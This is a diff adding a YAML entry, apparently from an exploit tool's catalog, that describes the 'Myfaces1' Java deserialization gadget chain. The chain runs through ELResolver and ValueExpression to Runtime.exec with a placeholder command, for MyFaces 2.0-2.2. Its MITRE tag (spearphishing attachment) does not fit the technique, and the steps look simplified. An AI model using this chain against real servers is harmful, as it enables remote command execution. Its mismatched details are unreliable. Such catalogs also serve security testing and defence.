@@ -1,0 +1,25 @@
+name: "Myfaces1"
+category: "myfaces"
+description: "Myfaces1 gadget chain using ELResolver and ValueExpression"
+jdk_version: "all"
+dependencies:
+  - name: "myfaces-impl"
+    version: "2.0-2.2"
+exploit_type: "command_execution"
+payload_type: "command"
+risk_level: 5
+mitre_technique: "T1566.001"
+references:
+  - "https://github.com/frohoff/ysoserial"
+steps:
+  - class_name: "org.apache.myfaces.el.unified.resolver.FacesCompositeELResolver"
+    method_name: "getValue"
+    parameters: []
+  - class_name: "javax.el.ValueExpression"
+    method_name: "getValue"
+    parameters:
+      - "{command}"
+  - class_name: "java.lang.Runtime"
+    method_name: "exec"
+    parameters:
+      - "{command}"
